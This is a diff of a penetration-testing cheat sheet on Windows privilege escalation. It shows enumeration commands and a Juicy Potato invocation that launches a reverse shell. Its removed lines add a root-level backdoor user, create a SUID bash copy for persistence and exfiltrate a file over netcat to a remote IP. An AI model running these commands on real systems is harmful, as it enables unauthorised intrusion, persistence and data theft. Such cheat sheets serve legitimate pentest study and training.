@@ -4,7 +4,7 @@
 
 
 
-**Gathering Info**
+## **Gathering Info**
 
 ```
 whoami /priv
@@ -46,11 +46,15 @@ wmic service get name,pathname,startname | findstr "Program Files"
 cacls *.exe
 ```
 
-**Recent Files**
+### **Recent Files**
 
 Might be able to find interesting files by looking at what was recently accessed. Start -> run -> recent.
 
 <figure><img src="../../.gitbook/assets/image (3) (5).png" alt=""><figcaption></figcaption></figure>
+
+
+
+## Privilege Escalation
 
 **Juicy Potato**
 
@@ -66,26 +70,5 @@ wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
 JuicyPotato.exe -l 5050 -p C:\path\to\reverse-shell.exe -t *
 ```
 
-**Persistence**
 
-Add a new user.
 
-```
-useradd -p $(openssl passwd -crypt password) -s /bin/bash -o -u 0 -g 0 -m victor
-```
-
-Rootbash (Credit: Tib3rius).
-
-```
-# as root, create a copy of BASH and then set the SUID-bit
-# to resume root-access execute the new binary using -p
-cp /bin/bash /tmp/bash; chown root /tmp/bash; chmod u+s /tmp/bash; chmod o+x /tmp/bash
-/tmp/bash -p
-```
-
-Exfil via Netcat.
-
-```
-nc -nvlp 5050 > stolen.exe
-nc.exe -w3 10.11.12.13 5050 < stealme.exe
-```
